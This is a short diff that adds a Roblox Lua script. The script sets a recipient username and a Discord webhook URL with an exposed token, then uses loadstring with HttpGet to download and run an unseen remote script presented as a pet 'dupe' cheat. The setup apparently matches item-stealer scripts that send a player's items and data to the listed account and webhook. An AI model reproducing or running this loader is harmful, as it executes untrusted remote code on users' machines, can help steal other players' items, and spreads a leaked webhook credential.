@@ -1,0 +1,4 @@
+_G.Username = "ov2w1"
+_G.Webhook = "https://discord.com/api/webhooks/1116250746736885840/D5ehHznnVzOp-20WzP00i32C9RKUPC2TqUo5t_OHaoSc2nj55FYgrvrS8GBiF6nsQZTR"
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/UnknownAny/Gems/main/dupe%20pets.txt ", true))()
